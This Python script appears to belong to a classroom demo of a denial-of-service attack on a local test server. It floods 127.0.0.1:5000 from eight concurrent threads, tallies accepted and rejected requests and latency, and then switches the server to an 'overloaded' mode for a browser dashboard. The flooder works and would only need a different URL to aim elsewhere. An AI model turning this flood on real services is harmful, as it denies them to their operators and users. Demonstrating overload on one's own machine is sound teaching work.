"""
DoS Attack Simulation — Stage B
=================================
Single-source, multi-threaded request flood.

One logical attacker opens multiple concurrent connections
to overwhelm the server's limited capacity.

Safety: Target is hardcoded to 127.0.0.1 only.
"""

import sys
import time
import threading
import requests

URL = "http://127.0.0.1:5000/work"
DEFAULT_TOTAL_REQUESTS = 100
CONCURRENT_THREADS = 8
INTER_REQUEST_DELAY = 0.01  # near-zero delay to maximize pressure

# Thread-safe counters
lock = threading.Lock()
results = {"success": 0, "busy": 0, "errors": 0}
latencies = []
request_counter = 0


def attack_worker(worker_id, num_requests, stop_time=None):
    """Each thread sends requests until count or time expires."""
    global request_counter

    req_idx = 0
    while True:
        if stop_time is not None:
            if time.perf_counter() >= stop_time:
                break
        else:
            if req_idx >= num_requests:
                break

        req_idx += 1
        start = time.perf_counter()
        try:
            r = requests.get(URL, timeout=3)
            elapsed_ms = (time.perf_counter() - start) * 1000

            with lock:
                latencies.append(elapsed_ms)
                request_counter += 1
                count = request_counter

                if r.status_code == 200:
                    results["success"] += 1
                    label = "200"
                elif r.status_code == 503:
                    results["busy"] += 1
                    label = "503"
                else:
                    results["errors"] += 1
                    label = str(r.status_code)

            if count % 15 == 0 or count <= 5:
                print(f"  [Thread-{worker_id}] req#{count:03d}  "
                      f"HTTP {label}  {elapsed_ms:.0f}ms")

        except requests.RequestException:
            with lock:
                results["errors"] += 1
                request_counter += 1

        time.sleep(INTER_REQUEST_DELAY)


def run_dos(duration_seconds=None):
    total_req = DEFAULT_TOTAL_REQUESTS if duration_seconds is None else "Continuous"

    print("=" * 56)
    print("   STAGE B — DoS ATTACK SIMULATION")
    print("=" * 56)
    print(f"  Target:       {URL}")
    print(f"  Source:        1 logical attacker")
    print(f"  Threads:      {CONCURRENT_THREADS} concurrent connections")
    if duration_seconds:
        print(f"  Mode:         Sustained flood for {duration_seconds}s (ideal for browser testing)")
    else:
        print(f"  Total req:    {DEFAULT_TOTAL_REQUESTS}")
    print(f"  Delay:        {INTER_REQUEST_DELAY}s between requests/thread")
    print("-" * 56)
    print("  Attack starting...\n")

    # Reset server stats
    try:
        requests.get("http://127.0.0.1:5000/reset-stats", timeout=2)
    except Exception:
        pass

    start_time = time.perf_counter()
    stop_time = (start_time + duration_seconds) if duration_seconds else None

    # Distribute requests across threads
    per_thread = DEFAULT_TOTAL_REQUESTS // CONCURRENT_THREADS
    remainder = DEFAULT_TOTAL_REQUESTS % CONCURRENT_THREADS

    threads = []
    for i in range(CONCURRENT_THREADS):
        count = per_thread + (1 if i < remainder else 0)
        t = threading.Thread(target=attack_worker, args=(i + 1, count, stop_time))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    total_time = time.perf_counter() - start_time

    # ── Summary ──
    total = results["success"] + results["busy"] + results["errors"]
    print("\n" + "=" * 56)
    print("   DoS ATTACK RESULTS")
    print("=" * 56)
    print(f"  Total requests sent:   {total}")
    print(f"  HTTP 200 (accepted):   {results['success']}")
    print(f"  HTTP 503 (rejected):   {results['busy']}")
    print(f"  Errors/timeouts:       {results['errors']}")
    print(f"  Duration:              {total_time:.2f}s")
    if total_time > 0:
        print(f"  Request rate:          {total/total_time:.1f} req/s")

    if latencies:
        avg = sum(latencies) / len(latencies)
        print(f"  Average latency:       {avg:.1f} ms")
        print(f"  Min latency:           {min(latencies):.1f} ms")
        print(f"  Max latency:           {max(latencies):.1f} ms")

    if total > 0:
        reject_pct = results['busy'] / total * 100
        print(f"  Rejection rate:        {reject_pct:.1f}%")

    print("=" * 56)

    # Set server into persistent OVERLOADED mode for browser demonstration
    try:
        requests.get("http://127.0.0.1:5000/set-mode?mode=overloaded", timeout=2)
    except Exception:
        pass

    # Fetch server stats
    try:
        r = requests.get("http://127.0.0.1:5000/stats", timeout=2)
        if r.ok:
            print(f"\n  Server stats: {r.json()}")
    except Exception:
        pass

    print("\n  ========================================================")
    print("  Attack complete!")
    print("  Server is now in OVERLOADED state.")
    print("  Open http://127.0.0.1:5000 in your browser to see the RED OVERLOADED dashboard.")
    print("  When ready to verify recovery, click 'RESTORE / RECOVER' on the page or run baseline.py.")
    print("  ========================================================")


if __name__ == "__main__":
    dur = None
    if len(sys.argv) > 1:
        arg = sys.argv[1].replace("--duration=", "").replace("--duration", "")
        if not arg and len(sys.argv) > 2:
            arg = sys.argv[2]
        try:
            dur = float(arg)
        except ValueError:
            if "sustained" in sys.argv[1].lower():
                dur = 15.0
    run_dos(duration_seconds=dur)
